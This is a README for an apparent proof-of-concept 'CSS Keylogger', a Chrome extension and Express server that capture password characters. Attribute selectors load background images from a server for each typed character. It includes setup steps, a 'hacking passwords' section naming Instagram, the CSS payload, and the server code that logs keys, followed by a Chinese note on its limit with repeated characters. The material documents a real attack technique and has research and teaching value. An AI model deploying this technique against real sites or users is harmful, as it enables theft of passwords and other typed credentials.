# CSS Keylogger

Chrome extension and Express server that exploits keylogging abilities of CSS.

## To use

### Setup Chrome extension

1. Download repository `git clone https://github.com/maxchehab/CSS-Keylogging`
2. Visit `chrome://extensions` in your browser (or open up the Chrome menu by clicking the icon to the far right of the Omnibox: The menu's icon is three horizontal bars. and select Extensions under the More Tools menu to get to the same place).
3. Ensure that the Developer mode checkbox in the top right-hand corner is checked.
4. Click `Load unpacked extension…` to pop up a file-selection dialog.
5. Select the `css-keylogger-extension` in the directory which you downloaded this repository.

### Setup Express server

1. `yarn`
2. `yarn start`

### Haxking l33t passw0rds

1. Open a website that uses a controlled component framework such as React. [https://instagram.com](https://www.instagram.com/).
2. Press the extension `C` on the top right of any webpage.
3. Type your password.
4. Your password should be captured by the express server.

## How it works

This attack is really simple. Utilizing CSS attribute selectors, one can request resources from an external server under the premise of loading a `background-image`.

For example, the following css will select all input's with a `type` that equals `password` and a `value` that ends with `a`.
It will then try to load an image from `http://localhost:3000/a`.

```css
input[type="password"][value$="a"] {
  background-image: url("http://localhost:3000/a");
}
```

Using a simple [script](https://github.com/maxchehab/CSS-Keylogging/blob/master/build.go) one can create a [css file](https://github.com/maxchehab/CSS-Keylogging/blob/master/css-keylogger-extension/keylogger.css) that will send a custom request for every ASCII character.


### 备注：

css 选择器加载外部资源，只能触发一次，例如：输入字母 ‘a’, 触发如下 css 代码

```css
input[type="password"][value$="a"] {
  background-image: url("http://localhost:3000/a");
}
```

在服务器端通过 `req.params.key` 获取到输入的内容

```js
app.get("/:key", (req, res) => {
  process.stdout.write(req.params.key);
  return res.sendStatus(400);
});
```

当再次输入字母 ‘a’ 时，上述的 css 代码并不会再次去请求外部资源，意味
着服务器端获取不到该次输入，最终的结果是只能捕获没有重复内容的密码。

例如：

|输入|实际捕获|
---|---
12345|12345
1014333|10143
123454321|12345


